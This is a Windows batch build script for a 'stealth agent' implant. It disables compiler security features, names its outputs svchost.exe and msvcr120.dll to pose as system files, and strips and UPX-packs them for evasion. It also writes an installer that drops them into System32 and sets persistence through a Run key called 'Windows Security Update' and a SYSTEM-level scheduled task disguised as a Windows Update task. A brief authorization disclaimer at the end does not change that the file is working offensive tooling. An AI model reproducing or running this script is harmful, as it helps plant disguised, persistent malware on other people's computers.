@echo off
REM Advanced Stealth Agent Build Script
REM This script builds the stealth agent with maximum evasion capabilities

echo [+] Starting Advanced Stealth Agent Build Process...

REM Set build environment
set BUILD_DIR=%~dp0build
set SOURCE_DIR=%~dp0
set CMAKE_BUILD_TYPE=Release

REM Create build directory
if not exist "%BUILD_DIR%" mkdir "%BUILD_DIR%"
cd /d "%BUILD_DIR%"

echo [+] Configuring CMake with stealth optimizations...

REM Configure with maximum optimization and stealth flags
cmake -G "Visual Studio 17 2022" -A x64 ^
    -DCMAKE_BUILD_TYPE=Release ^
    -DCMAKE_CXX_FLAGS_RELEASE="/O2 /Ob2 /DNDEBUG /MT /GL /Gy /GS- /Qspectre-" ^
    -DCMAKE_C_FLAGS_RELEASE="/O2 /Ob2 /DNDEBUG /MT /GL /Gy /GS- /Qspectre-" ^
    -DCMAKE_EXE_LINKER_FLAGS_RELEASE="/LTCG /OPT:REF /OPT:ICF /SUBSYSTEM:WINDOWS /ENTRY:mainCRTStartup" ^
    -DCMAKE_SHARED_LINKER_FLAGS_RELEASE="/LTCG /OPT:REF /OPT:ICF" ^
    -DENABLE_STEALTH_BUILD=ON ^
    "%SOURCE_DIR%"

if %ERRORLEVEL% neq 0 (
    echo [-] CMake configuration failed!
    pause
    exit /b 1
)

echo [+] Building stealth agent...

REM Build the project
cmake --build . --config Release --parallel

if %ERRORLEVEL% neq 0 (
    echo [-] Build failed!
    pause
    exit /b 1
)

echo [+] Post-processing binaries for maximum stealth...

REM Strip debug symbols and optimize
if exist "Release\svchost.exe" (
    echo [+] Processing svchost.exe...
    
    REM Strip symbols
    strip --strip-all "Release\svchost.exe" 2>nul
    
    REM Pack with UPX (if available)
    upx --best --ultra-brute "Release\svchost.exe" 2>nul
    if %ERRORLEVEL% equ 0 (
        echo [+] UPX packing successful
    ) else (
        echo [!] UPX not available or failed, continuing...
    )
    
    REM Calculate file hash for verification
    certutil -hashfile "Release\svchost.exe" SHA256 | find /v "hash" | find /v "CertUtil"
echo.
)

if exist "Release\msvcr120.dll" (
    echo [+] Processing msvcr120.dll...
    
    REM Strip symbols
    strip --strip-all "Release\msvcr120.dll" 2>nul
    
    REM Pack with UPX (if available)
    upx --best --ultra-brute "Release\msvcr120.dll" 2>nul
    if %ERRORLEVEL% equ 0 (
        echo [+] UPX packing successful
    ) else (
        echo [!] UPX not available or failed, continuing...
    )
    
    REM Calculate file hash for verification
    certutil -hashfile "Release\msvcr120.dll" SHA256 | find /v "hash" | find /v "CertUtil"
echo.
)

echo [+] Creating deployment package...

REM Create deployment directory
if not exist "..\deploy" mkdir "..\deploy"

REM Copy binaries to deployment directory
if exist "Release\svchost.exe" (
    copy "Release\svchost.exe" "..\deploy\" >nul
    echo [+] svchost.exe copied to deploy directory
)

if exist "Release\msvcr120.dll" (
    copy "Release\msvcr120.dll" "..\deploy\" >nul
    echo [+] msvcr120.dll copied to deploy directory
)

REM Create installation script
echo [+] Creating installation script...

(
echo @echo off
echo REM Stealth Agent Installation Script
echo.
echo echo [+] Installing stealth agent...
echo.
echo REM Copy to system directory with legitimate name
echo copy "%%~dp0svchost.exe" "%%WINDIR%%\System32\" ^>nul 2^>^&1
echo copy "%%~dp0msvcr120.dll" "%%WINDIR%%\System32\" ^>nul 2^>^&1
echo.
echo REM Install persistence
echo reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Windows Security Update" /t REG_SZ /d "%%WINDIR%%\System32\svchost.exe" /f ^>nul 2^>^&1
echo.
echo REM Create scheduled task
echo schtasks /create /tn "Microsoft\Windows\WindowsUpdate\Automatic App Update" /tr "%%WINDIR%%\System32\svchost.exe" /sc onlogon /ru SYSTEM /f ^>nul 2^>^&1
echo.
echo echo [+] Installation complete
echo pause
) > "..\deploy\install.bat"

REM Create uninstallation script
(
echo @echo off
echo REM Stealth Agent Removal Script
echo.
echo echo [+] Removing stealth agent...
echo.
echo REM Stop processes
echo taskkill /f /im svchost.exe ^>nul 2^>^&1
echo.
echo REM Remove persistence
echo reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Windows Security Update" /f ^>nul 2^>^&1
echo schtasks /delete /tn "Microsoft\Windows\WindowsUpdate\Automatic App Update" /f ^>nul 2^>^&1
echo.
echo REM Remove files
echo del "%%WINDIR%%\System32\svchost.exe" ^>nul 2^>^&1
echo del "%%WINDIR%%\System32\msvcr120.dll" ^>nul 2^>^&1
echo.
echo echo [+] Removal complete
echo pause
) > "..\deploy\uninstall.bat"

echo.
echo [+] Build process completed successfully!
echo.
echo [+] Deployment files created in: %SOURCE_DIR%deploy
echo [+] Available binaries:
if exist "..\deploy\svchost.exe" echo     - svchost.exe (Main executable)
if exist "..\deploy\msvcr120.dll" echo     - msvcr120.dll (DLL version)
echo     - install.bat (Installation script)
echo     - uninstall.bat (Removal script)
echo.
echo [!] IMPORTANT SECURITY NOTES:
echo     - Test in isolated environment first
echo     - Ensure proper authorization before deployment
echo     - Use only for legitimate security testing
echo     - Review all persistence mechanisms
echo.
echo [+] Build completed at: %date% %time%

cd /d "%SOURCE_DIR%"
pause